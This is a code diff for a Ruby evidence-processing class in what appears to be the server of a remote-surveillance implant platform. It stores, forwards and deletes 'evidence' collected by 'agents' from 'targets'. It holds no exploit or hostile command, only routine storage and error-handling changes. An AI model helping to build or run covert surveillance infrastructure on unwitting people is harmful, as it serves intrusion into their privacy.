@@ -39,11 +39,10 @@ class InstanceProcessor
     # get info about the agent instance from evidence db
     #@db = Mongo::Connection.new(RCS::DB::Config.instance.global['CN'], 27017).db("rcs")
     @agent = Item.agents.where({ident: ident, instance: instance}).first
-    @target = @agent.get_parent
-    
-    #@info = RCS::EvidenceManager.instance.instance_info @id
     raise "Agent \'#{ident}:#{instance}\' cannot be found." if @agent.nil?
-    
+
+    @target = @agent.get_parent
+
     trace :info, "Created processor for agent #{@agent['ident']}:#{@agent['instance']}"
     
     # the log key is passed as a string taken from the db
@@ -68,6 +67,7 @@ class InstanceProcessor
 
             raw = data.read
 
+=begin
             if forwarding?
               hash = Digest::SHA1.hexdigest(raw)
               Dir.mkdir "forwarded" unless File.exists? "forwarded"
@@ -75,6 +75,7 @@ class InstanceProcessor
               f = File.open(path, 'w') {|f| f.write raw}
               trace :debug, "[#{evidence_id}] forwarded raw evidence #{evidence_id} to #{path}"
             end
+=end
 
             # deserialize binary evidence and forward decoded
             evidences = begin
@@ -118,9 +119,17 @@ class InstanceProcessor
               ev.process if ev.respond_to? :process
 
               # override original type
-              ev_type = ev[:type] = ev.type
+              ev[:type] = ev.type if ev.respond_to? :type
+              ev_type = ev[:type]
 
               ev.store @agent, @target
+
+              if forwarding? and ev[:grid_content]
+                Dir.mkdir "forwarded" unless File.exists? "forwarded"
+                path = "forwarded/#{evidence_id}_#{ev_type}.grid"
+                f = File.open(path, 'w') {|f| f.write ev[:grid_content]}
+                trace :debug, "[#{evidence_id}] forwarded grid evidence #{evidence_id} to #{path}"
+              end
 
               #
               # FORWARDER: forward&sign parsed evidence
@@ -130,6 +139,9 @@ class InstanceProcessor
             processing_time = Time.now - start_time
             trace :info, "[#{evidence_id}] processed #{ev_type.upcase} for agent #{@agent['name']} in #{processing_time} sec"
 
+            RCS::DB::GridFS.delete(evidence_id, "evidence")
+            trace :debug, "[#{evidence_id}] deleted raw evidence"
+
           rescue Mongo::ConnectionFailure => e
             trace :error, "[#{evidence_id}] cannot connect to database, retrying in 5 seconds ..."
             sleep 5
@@ -137,9 +149,11 @@ class InstanceProcessor
           rescue Exception => e
             trace :fatal, "FAILURE: " << e.to_s
             trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
-          ensure
-            RCS::DB::GridFS.delete(evidence_id, "evidence")
-            trace :debug, "[#{evidence_id}] deleted raw evidence"
+
+            Dir.mkdir "forwarded" unless File.exists? "forwarded"
+            path = "forwarded/#{evidence_id}.raw"
+            f = File.open(path, 'w') {|f| f.write raw}
+            trace :debug, "[#{evidence_id}] forwarded undecoded evidence #{evidence_id} to #{path}"
           end
         end
         take_some_rest
